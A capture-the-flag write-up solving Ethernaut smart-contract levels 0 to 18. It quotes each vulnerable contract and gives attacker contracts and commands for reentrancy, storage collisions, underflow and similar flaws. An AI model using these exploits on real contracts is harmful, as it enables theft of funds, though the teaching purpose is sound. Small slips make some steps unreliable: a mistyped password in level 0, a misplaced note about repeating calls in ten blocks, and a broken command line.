Below is a collection of solutions to the challenges of OpenZeppelin's Ethernaut CTF.

# 0. Hello Ethernaut

To complete this level, you can print the password using

```javascript
await contract.password()
// Prints 'ethernaut0'
```

in the ethernaut console. Subsequently, you can submit the password via:

```javascript
await contract.authenticate("ethernau0")
```

Finally, simply submit your contract instance to complete the level.

# 1. Fallback

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## Solution

The goal of this challenge is to:

1. Become the contract's owner.
2. Reduce the contract's balance to 0.

Looking at the contract, we can see that `receive()` function allows us to set ourselves as the owner.
However, to successfully call `receive()`, we first need to make a non-zero contribution by calling `contribute()` and sending a non-zero amount (e.g., 1 wei) with that function call.
We can achieve this in the Ethernaut console as follows:

```javascript
contract.contribute({value: 1})
```

Now that our address has made a contribution to the contract, we can call `receive()` by sending an arbitrary, non-zero ether amount (e.g., 1 wei) to the contract.
The easiest way to do this is to simply use MetaMask.
After that transfer, we are the new owner of the contract, which allows us to call `withdraw()` to reduce the contract's balance to zero.

# 2. Fallout

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

## Solution

The name of the "constructor" contains a typo: the intended name is `Fallout()` but the actual one is `Fal1out()`.
For this reason, the contract does not actually have a constructor and `Fal1out()` is just a regular function anyone can call to claim ownership.
Therefore, we can solve the level by entering 

```javascript
contract.Fal1out()
```

in the Ethernaut console.

# 3. Coin Flip

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## Solution

The goal of this challenge is to predict the coin flip 10 times in a row.
Looking at the contract, we can see that it uses the previous block's hash as a source of "randomness".
This pattern is what is commonly referred to as "weak random number generation (Weak RNG)" since attackers can simply use the same "random" number generation logic to predict the outcome.

Take, for example, the following attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttacker {
    // FACTOR = type(uint256).max / 2 + 1
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    function attack() external {
        // Use the same source of "randomness" as the victim contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        // Flip the coin and provide the correct guess
        (bool success, ) = VICTIM.call(abi.encodeWithSignature("flip(bool)", guess));
        require(success, "Coin flip failed");
    }
}
```

# 4. Telephone

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## Solution

To claim ownership of the above contract, we need to call `changeOwner()` while ensuring that `tx.origin != msg.sender`.
This is easily achieved by calling `changeOwner()` from the following attacker contract rather than our externally owned account:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttacker {
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    function attack() external {
        (bool success, ) = VICTIM.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(success, "Attack failed");
    }
}
```

Deploying this contract using [Remix](https://remix.ethereum.org) and providing our victim contract's address in the constructor, we can simply call `attack()` 10 times in a row to win the level.
Note that these 10 calls need to be distributed over 10 different blocks.

# 5. Token

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

## Solution

We start out with a token balance of 20. The goal of this level is to increase our balance even further.

Recall that Solidity did not have built-in protection against arithmetic overflows/underflows prior to version 0.8.0.
Therefore, sending 21 tokens to the another account (e.g., the zero address) will underflow our balance by 1 and result in a new balance of `type(uint256).max = 115792089237316195423570985008687907853269984665640564039457584007913129639935`.
In other words, all we have to do is to enter 

```javascript
contract.transfer("0x0000000000000000000000000000000000000000", 21)
```

in the Ethernaut console.

# 6. Delegation

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## Solution

Our goal in this level is to become the owner of the `Delegate` contract.
To achieve this, we can send a transaction to the `Delegation` contract, specifying the `pwn()` function's selector in the calldata.
This will trigger `Delegation`'s `fallback()` function since `pwn()`'s function selector does not correspond to any function in `Delegation`.
The `fallback()` function will in turn make a `delegatecall` to the `Delegate` contract's `pwn()` function since our calldata matches `pwn()`'s selector.
Since we "delegatecalled" `pwn()`, `msg.sender` is still our externally owned account's address, making us the new owner of the `Delegate` contract.

To sum up, one needs to perform two steps to solve this level:

1. Compute `pwn()`'s function selector. It reads `0xdd365b8b`. (Recall that the function selector is the first four bytes of the keccak256 hash of the function signature. There are several [tools](https://www.evm-function-selector.click/) available to compute it in no time.)
2. Send the transaction explained above using the Ethernaut console via:
```javascript
contract.sendTransaction({data: "0xdd365b8b"})
```

# 7. Force

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

## Solution

To solve this level, we need to exploit the fact that `selfdestruct` allows to force-send ether to a contract, even if this contract does not have any payable functions.
More precisely, we can simply deploy the following attacker contract and send an arbitrary amount of ether (e.g., 1 wei) to that attacker contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    receive() external payable {
        selfdestruct(payable(VICTIM));
    }
}
```

Note, however, that this exploit will likely no longer work in the future due to the deprecation of `selfdestruct`.

At the time of writing this post, you will get the following warning when using the above attacker contract in Remix:
_Warning: "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode._

# 8. Vault

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Solution

The goal of this level is to unlock the vault by providing the correct password.

First, recall that while marking a variable as `private` prevents other contracts from accessing it, it does not mean that the value of this variable is not publicly accessible.
In fact, we can easily inspect `password` by accessing the storage slot with index 1 (index 0 stores the `locked` state) using [Cast](https://book.getfoundry.sh/cast/):

```bash
cast storage --rpc-url=<your rpc url> <your level instance address> 1
```

This tells us that the correct password is `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`.

_**Note** For the fun of it, we can  convert this from `bytes32` to ASCII via:_

```bash
# Returns "A very strong secret password :)"
cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

To complete the level, we can simply call the unlock function using the above password as the function parameter:

```bash
cast send <your level instance address> "unlock(bytes32)" "0x412076657279207374726f6e67207365637265742070617373776f7264203a29" --private-key <your private key> --rpc-url <your rpc url> --gas-price <a sufficiently high gas price>
```

_**Note** You can check the current gas price via:_

```bash
cast gas-price --rpc-url <your rpc url>
```

# 9. King

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## Solution

The goal of this level is to become the king forever.

First, we can inspect how much funds we have to send to the contract to become the new king:

```bash
cast storage <your level instance address> 1 --rpc-url $SEP_RPC_URL
# Result: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000

cast to-dec 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
# Result: 1000000000000000
```

This tells us that the prize is 1 Finney.

Second, we see that `receive()` sends funds to the current king before assigning the new king.
This means we can solve this level by deploying an attacker contract that contains

1. a function that allows it to become the new king and
2. a `receive()` function that always reverts.

In other words, we can use Remix to deploy the following attacker contract and subsequently call `becomeKing()` specifying a value of at least 1 Finney.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public immutable LEVEL_INSTANCE;

    constructor(address levelInstance) {
        LEVEL_INSTANCE = levelInstance;
    }

    function becomeKing() external payable {
        (bool success, ) = payable(LEVEL_INSTANCE).call{value: msg.value}("");
        require(success, "Transfer failed");

    }

    receive() external payable {
        revert("Long live Marco XLII");
    }
}
```

# 10. Re-entrancy

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## Solution

To complete this level, we need to drain all funds from the contract.
This can be achieved by exploiting the fact that the contract's `withdraw()` function does not follow the checks-effects-interactions pattern and is, therefore, vulnerable to the well-known [reentrancy attack](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#reentrancy).

First, we can check the balance of our victim via:

```bash
cast balance <your level instance address> --rpc-url $SEP_RPC_URL --ether
# Result: 0.001000000000000000
```

To steal 1 Finney from the contract, we can use the following attacker:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    IReentrance public immutable VICTIM;
    bool public reentered;

    constructor(address victim) {
        VICTIM = IReentrance(victim);
    }

    function attack() external payable {
        VICTIM.donate{value: 1e15}(address(this));
        VICTIM.withdraw(1e15); // 1e15 = 1 Finney
    }

    receive() external payable {
        if (!reentered) {
            VICTIM.withdraw(1e15);
            reentered = true;
        }
    }
}
```

Note that we must send a value of 1 Finney when calling `attack()`.

# 11. Elevator

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## Solution

The goal of this level is to set `top` to `true`.

To achieve this, we need to ensure our attacker/building contract lies about the fact that the elevator reached the top floor when `isLastFloor()` is called the first time (so that we enter the `if` statement), but tells the truth when called the second time (so that we set `top` to `true`).

So, to complete the level, we can simply deploy the below attacker/building contract and call `goTo(42)`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    IElevator public immutable VICTIM;
    uint256 public constant TOP_FLOOR = 42;

    bool public tellTheTruth;

    constructor(address victim) {
        VICTIM = IElevator(victim);
    }

    function goTo(uint256 floor) external {
        VICTIM.goTo(floor);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (floor == TOP_FLOOR) {
            // When the top is reached, lie when asked the first time but tell the truth when asked the second time
            if (tellTheTruth == false) {
                tellTheTruth = true;
                return false;
            } else {
                return true;
            }
        } else {
            // If the top is not reached, always tell the truth
            return false;
        }
    }
}
```

# 12. Privacy

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

## Solution

The goal of this level is to set `locked` to `false`.

A prerequisite for this level is to [understand the storage layout of smart contracts](https://medium.com/@ozorawachie/solidity-storage-layout-and-slots-a-comprehensive-guide-2cee71817ed8).

Looking at the above contract, we see that the last element of the `data` array (`data[2]`) is stored in the storage slot with index 5. 
More specifically, the storage layout looks like this:
- Slot 0: `locked`
- Slot 1: `ID`
- Slot 2: `flattening`, `denomination`, and `awkwardness`
- Slot 3: `data[0]`
- Slot 4: `data[1]`
- Slot 5: `data[2]`

So, to get the correct `_key`, we need to read the first 34 characters (2 for the `0x` and 32 for the first 16 bytes) of the value stored in slot 5.

```bash
cast storage <your level instance> 5 --rpc-url $SEP_RPC_URL | cut -c 1-34
# Result: 0x0f09b23d6279de8f8e7fc60d468bf0fb
```

Subsequently, we can unlock the contract via:

```bash
cast send <your level instance> "unlock(bytes16)" 0x0f09b23d6279de8f8e7fc60d468bf
0fb --rpc-url $SEP_RPC_URL --private-key <your private key>
```

# 13. Gatekeeper One

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## Solution

The goal of this level is to register yourself as an `entrant`.

To pass `gateOne()`, we need to call `enter()` from a contract rather than from our EOA.

To pass `gateTwo()`, we need to forward a very specific amount of gas during the call to `enter()` such that the `gasleft()` when entering `gateTwo()` is a multiple of 8191.
While we could reverse-engineer this gas amount using, e.g., the Remix debugger, it's easier to simply bruteforce our way in, forwarding a different amount of gas with each try.

To pass `gateThree()`, let's take a closer look at the three `require` statements, starting with part 3:
Suppose our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.
Using chisel, we can then see that the right-hand side of part 3 evaluates to:
```
➜ address player = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
➜ uint16(uint160(player))
Type: uint16
├ Hex: 0xddc4
├ Hex (full word): 0x000000000000000000000000000000000000000000000000000000000000ddc4
└ Decimal: 56772
 ```

 Part 3 requires this to be equal to the full word of `uint32(uint64(_gateKey))`.
 In other words, the last 4 bytes of our `_gateKey` should be 0000ddc4.

 Part 2 tells us that at least one character of the first 4 bytes of our `_gateKey` must not be zero.
 See, for example:

```
➜ bytes8 key = 0x5931b4ed56ace4c4;
➜ uint64(key)
Type: uint64
├ Hex: 0x5931b4ed56ace4c4
├ Hex (full word): 0x0000000000000000000000000000000000000000000000005931b4ed56ace4c4
└ Decimal: 6427117074688828612
➜ uint32(uint64(key))
Type: uint32
├ Hex: 0x56ace4c4
├ Hex (full word): 0x0000000000000000000000000000000000000000000000000000000056ace4c4
└ Decimal: 1454171332
```

Finally, part 1 tells us that the last 4 bytes must be of the form 0000xxxx, where "xxxx" can be two arbitrary bytes. 
Notice that this is a similar requirement to part 3, but is actually less restrictive, since part 3 constraints those last two bytes to be exactly the last two bytes of our player's account address.
In that sense, the level's contraints would stay exactly the same, even if part 1 were deleted.

As a conclusion, one possible `_gateKey` is 0x1234abcd0000ddc4, assuming that our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.

With this information, we can solve the challenge using the following attacker:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    function attack(bytes8 gateKey) external {
        for (uint256 i; i < 8191; i++) {
            (bool success, ) = VICTIM.call{gas: i + 5 * 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
    }
}
```

In the above contract, notice that we added a sufficiently high multiple of 8191 to our forwarded amount of gas so that we ensure that there's sufficient gas to execute the entire function call.

# 14. Gatekeeper Two

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## Solution

The goal of this level is to register yourself as an `entrant`.

To pass `gateOne()`, we need to call `enter()` from a contract rather than from our EOA.
At first sight, this looks like a direct contradiction to the second gate since `gateTwo()` requires `extcodesize(caller())` to equal zero.
However, section 7.1 of the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) tells us that _"while the initialisation code is executing, the newly created address exists but with no intrinsic body code."_
In other words, if we call `enter()` in the constructor of a contract, `gateTwo()` will determine that the `extcodesize()` of that contract is zero.

To understand how we can pass `gateThree()`, let's take a closer look at the corresponding `require` statement.
Our goal is to pass a `bytes8 _gateKey` such that the left-hand side (LHS) becomes `type(uint64).max`, i.e., the largest 64-bit unsigned integer.
Here is what this number looks like in different integer representations:

    - Decimal positional system: 18446744073709551615
    - Binary positional system: 1111111111111111111111111111111111111111111111111111111111111111
    - Hexadecimal positional system: 0xffffffffffffffff

_Note: If you're not familiar with integer representations, section 3.2.5 of [The MoonMath Manual](https://github.com/LeastAuthority/moonmath-manual?tab=readme-ov-file) is a great introduction to the topic._

Taking a closer look at the LHS, the first important thing to notice is that `msg.sender` will be the address of the calling contract.
Without loss of generality, let's assume this address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 so that we can compute a concrete example of the first operand on the LHS via [Chisel](https://book.getfoundry.sh/chisel/):

```
➜ uint64(bytes8(keccak256(abi.encodePacked(myAddress))))
Type: uint64
├ Hex: 0x5931b4ed56ace4c4
├ Hex (full word): 0x0000000000000000000000000000000000000000000000005931b4ed56ace4c4
└ Decimal: 6427117074688828612
```

The binary representation of this number is 0101100100110001101101001110110101010110101011001110010011000100.
In order for the `^` (XOR) operation to yield the largest 64-bit unsigned integer, 111...111, the second operand needs to be the [bitwise NOT](https://en.wikipedia.org/wiki/Bitwise_operation#NOT) of the first operand.
In Solidity, the bitwise NOT can be applied via `~`.

As a conclusion, we can solve the level by deploying the following contract, specifying our level-instance address as the `victim`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo public immutable VICTIM;

    constructor(address victim) {
        VICTIM = IGatekeeperTwo(victim);
        VICTIM.enter(~bytes8(keccak256(abi.encodePacked(address(this)))));
    }
}
```

# 15. Naught Coin

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

## Solution

The goal is to transfer all tokens from our `player` account to another address. At first sight, this looks like an impossible thing to do because the `lockTokens` modifier prevents the `player` from executing `transfer` during the first 10 years after contract deployment.

However, notice that the ERC-20 interface exposes _two_ functions that facilitate token transfers: `transfer` and `transferFrom`.

In the above contract, `transfer` is overridden and protected by `lockTokens`. `transferFrom`, however, is _not_ overridden and, in particular, _not_ protected by the `lockTokens` modifier!

Therefore, we can solve this challenge using the following steps:
First, we use our `player` account to approve a second account we control for the entire `INITIAL_SUPPLY`.
The quickest way to do this is through the Ethernaut console.

```javascript
contract.approve("<your second account address>", "1000000000000000000000000")
```

Subsequently, we can call `transferFrom` from our second account, transferring the tokens from `player`'s account to our second account.
The following line shows how to do this using Cast.

```bash
cast send --private-key <private key of your second account> --rpc-url $SEP_RPC_URL <your level instance> "transferFrom(address,address,uint256)" <your player address> <address of your second account> 1000000000000000000000000
```

# 16. Preservation

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

## Solution

The goal of this challenge is to become the `owner`.

If you don't have a solid understanding of `delegatecall` and storage collisions yet, [this blog post](https://blog.finxter.com/delegatecall-or-storage-collision-attack-on-smart-contracts/) is a great introduction.

We'll execute our attack via three steps:

1. Deploy an attacker contract with a `setTime()` function and design its storage layout such that a call to `setTime()` will lead to a collision with the level's `owner`.
2. Use either the `setFirstTime()` or the `setSecondTime()` function to set `timeZone1Library` to our attacker's address.
3. Use `setFirstTime()` to set `owner` to our EOA's address.

For step 1, we'll deploy the following attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    uint256 occupyFirstSlot = 42;
    uint256 occupySecondSlot = 42;
    uint256 owner;

    function setTime(uint256 _owner) external {
        owner = _owner;
    }
}
```

In my case, the address of the deployed `PreservationAttacker` reads 0x2124E3b48A11008d36171b9a7e8315fE572E341C.

Next, we can either use `setFirstTime()` or `setSecondTime()` to set `timeZone1Library` to this address. 
However, since those functions expect a `uint256` as their parameter, we must first convert the hex representation of our address to decimal via

```bash
cast to-dec 0x2124E3b48A11008d36171b9a7e8315fE572E341C
# Result: 189219358187588105730525764077460654362006008860
```

and subsequently use the Ethernaut console to call the setter:

```javascript
await contract.setFirstTime("189219358187588105730525764077460654362006008860")
```

Notice that we pass the big number as a string to avoid JavaScript-related overflow issues during the call.

With our `timeZone1Library` set to our attacker, we can now use `setFirstTime()` to set the `owner` to our EOA's address.
Assuming that this address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, we can first convert it to decimal representation

```bash
cast to-dec 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
# Result: 520786028573371803640530888255888666801131675076
```

and then make the call via the Ethernaut console

```javascript
await contract.setFirstTime("520786028573371803640530888255888666801131675076")
```

making us the `owner` and completing the challenge.

# 17. Recovery

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

## Solution

The goal of this challenge is determine the address of the `SimpleToken` contract and recover the 0.001 ETH that the contract creator sent to it. 

As a first step, we search for the level instance address, i.e., the address of the `Recovery` contract, on [sepolia.etherscan.io](https://sepolia.etherscan.io).
Looking at the _Internal Transactions_ tab, we see two _Contract Creation_ transactions.
One of them has the level instance address as its _From_ address, telling us that it corresponds to the creation of the `SimpleToken` contract in the constructor of the `Recovery` contract.
If we click on its _Contract Creation_ link under _To_, Etherscan will take us to the detail view of the `SimpleToken` contract.
In particular, it will reveal the `SimpleToken`'s contract address.
Knowing this address, we can now call the `destroy()` function, specifying an arbitrary address, e.g., our `player`, as the `_to` parameter.
 
```bash
cast send <your level instance> "destroy(address)" <your player address> --private-key <your private key> --rpc-url $SEP_RPC_URL
```

# 18. MagicNumber

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```

## Solution

The goal of this challenge is to create a `solver` contract that returns 42 whenever `whatIsTheMeaningOfLife()` is called. 
